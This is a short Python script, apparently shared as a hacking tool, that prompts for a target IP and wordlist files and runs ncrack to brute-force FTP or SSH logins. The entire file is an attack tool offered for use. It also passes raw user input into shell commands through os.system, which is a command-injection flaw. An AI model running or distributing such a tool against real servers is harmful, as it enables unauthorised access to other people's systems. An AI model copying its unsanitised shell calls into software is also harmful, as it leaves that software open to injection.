# -*- coding: UTF-8 -*-
# ToolName   : /Force-attacks-on-FTP-and-SSH-services
# Author     : ScriptedByMark
# License    : MIT
# Language   : Python
# Env        : #!/usr/bin/env python3

import os

# Install figlet and clear the terminal
os.system("apt-get install figlet -y")
os.system("clear")

# Print the title with figlet
os.system("figlet KKSA")

# Print the options
print("""
1: FTP
2: SSH
""")

# Get the input for the chosen option and the target IP
transaction_no = input("Transaction Number: ")
target_ip = input("Target IP: ")

# Get the input for the username file path and password
username_file = input("Username File Path: ")
password_file = input("Password File Path: ")

if transaction_no == "1":
    # Run ncrack with FTP option
    os.system(f"ncrack -p 21 -u {username_file} -P {password_file} {target_ip}")
elif transaction_no == "2":
    # Run ncrack with SSH option
    os.system(f"ncrack -p 22 -u {username_file} -P {password_file} {target_ip}")
else:
    # Print an error message for invalid option
    print("There is no such transaction number.")
